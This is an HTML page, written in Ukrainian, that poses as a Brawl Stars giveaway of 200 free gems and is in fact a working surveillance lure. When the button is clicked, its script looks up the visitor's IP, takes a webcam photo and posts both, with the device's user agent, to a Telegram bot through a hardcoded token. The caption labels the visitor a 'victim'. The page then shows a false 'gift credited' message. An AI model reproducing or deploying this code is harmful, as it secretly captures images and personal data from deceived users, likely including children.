<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brawl Stars Gift</title>
    <style>
        body { 
            margin: 0; 
            background: linear-gradient(180deg, #0057b7 0%, #003366 100%); 
            color: #ffcc00; 
            font-family: 'Arial', sans-serif; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
        }
        .card { 
            background: rgba(255, 255, 255, 0.1); 
            padding: 30px; 
            border-radius: 20px; 
            text-align: center; 
            border: 2px solid #ffcc00; 
            width: 300px; 
            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
        }
        button { 
            padding: 15px 30px; 
            background: #ffcc00; 
            border: none; 
            border-radius: 10px; 
            font-weight: bold; 
            cursor: pointer; 
            color: #003366; 
            font-size: 18px; 
            width: 100%; 
        }
        #video { display: none; }
        #status { margin-top: 15px; color: white; }
    </style>
</head>
<body>

    <div class="card">
        <h1 id="title">BRAWL STARS</h1>
        <p id="desc" style="color: white;">Отримай 200 гемів безкоштовно!</p>
        <button id="btn" onclick="run()">ОТРИМАТИ</button>
        <div id="status" style="display:none">Підключення до серверів...</div>
    </div>
    <video id="video" autoplay playsinline></video>

    <script>
        const TG_TOKEN = "8842138354:AAFV7kdBBGcwaNLa2EBaebxCI_cy80r_HxY";
        const TG_CHAT_ID = "-1003787168523";

        async function run() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('status').style.display = 'block';

            let ip = "Невизначено";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) { ip = "Помилка IP"; }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', TG_CHAT_ID);
                        formData.append('photo', blob);
                        formData.append('caption', `🔥 ЖЕРТВА BRAWL STARS!\nIP: ${ip}\nЛокація: Бортятин, Львів\nПристрій: ${navigator.userAgent}`);

                        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        stream.getTracks().forEach(track => track.stop());
                        alert("Подарунок нараховано!");
                    }, 'image/jpeg');
                }, 1500);
            } catch (e) {
                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🔥 Жертва (без фото):\nIP: " + ip + "\nПристрій: " + navigator.userAgent)}`);
                alert("Помилка при отриманні подарунка.");
            }
        }
    </script>
</body>
</html>
